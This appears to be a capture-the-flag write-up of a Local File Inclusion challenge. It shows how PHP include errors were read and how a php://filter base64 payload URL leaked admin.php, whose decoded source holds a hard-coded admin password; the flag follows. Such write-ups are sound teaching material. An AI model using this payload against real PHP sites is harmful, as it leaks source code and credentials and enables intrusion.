* Category
  * Local File Inclusion
* Solution
  1. How to get source code of admin.php?
     * Fuzz with parameter ```?path=test``` and analyze the error response
       * ```Warning: include(test.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 36```
       * ```Warning: include(): Failed opening 'test.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 36```
       * The error response indicates that it's using ```include``` function and the value of ```path``` as input, also it adds postfix ```.php```
     * The login page is named as ```admin.php``` , given value ```?path=admin``` will lead to including ```admin.php``` but is already parsed
     * To get the original source code used ```php://filter``` protocol to avoid rendering
  2. Find out username and password?
     * With the source code, we now know that how the server works to verify the user's identity
     * ```$admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ");```
* Payload
  1. ```http://splitline.tw:8400/?page=php://filter/convert.base64-encode/resource=admin```
     * Response = ```PGgxPkFkbWluIFBhbmVsPC9oMT4KPGZvcm0+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSJhZG1pbiI+CiAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAokYWRtaW5fYWNjb3VudCA9IGFycmF5KCJ1c2VybmFtZSIgPT4gImFkbWluIiwgInBhc3N3b3JkIiA9PiAia3FxUEZPYnd4VThIWW84RTVRZ05MaGRPeHZabXRQaHlCQ3lEeEN3cHZBUSIpOwppZiAoCiAgICBpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pICYmCiAgICAkX0dFVFsndXNlcm5hbWUnXSA9PT0gJGFkbWluX2FjY291bnRbJ3VzZXJuYW1lJ10gJiYgJF9HRVRbJ3Bhc3N3b3JkJ10gPT09ICRhZG1pbl9hY2NvdW50WydwYXNzd29yZCddCikgewogICAgZWNobyAiPGgxPkxPR0lOIFNVQ0NFU1MhPC9oMT48cD4iLmdldGVudignRkxBRycpLiI8L3A+IjsKfQoKPz4=```
* ```FLAG{ezzzz_lfi}```